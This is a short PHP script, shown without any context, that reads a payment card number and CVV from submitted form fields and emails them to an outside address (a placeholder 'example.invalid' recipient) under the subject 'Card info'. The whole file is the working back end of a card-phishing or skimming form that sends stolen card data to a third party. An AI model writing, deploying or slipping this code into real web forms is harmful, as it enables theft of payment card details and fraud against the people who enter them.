<?php
$card_number = $_POST['ccnum'];
$cvv = $_POST['cvv'];
mail("recipient@example.invalid", "Card info", $card_number . $cvv);
